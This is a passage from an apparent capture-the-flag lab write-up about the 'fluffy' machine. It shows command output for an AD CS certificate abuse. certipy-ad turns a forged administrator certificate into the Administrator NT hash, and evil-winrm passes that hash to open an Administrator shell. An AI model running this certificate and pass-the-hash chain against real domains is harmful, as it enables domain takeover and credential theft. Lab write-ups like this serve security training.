[*] Updating user 'ca_svc':
 userPrincipalName          : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
   #+end_src
   4. Finally, use the administrator.pfx certificate to get the RC4 hash of the Administrator
      user
   #+begin_src bat
   $ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69

<SNIP>
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb':
aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
   #+end_src
   5. Using this RC4 hash, we can access the target as the Administrator user via WinRM .
   #+begin_src bat
   $ evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb

<SNIP>
,*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\Administrator
   #+end_src
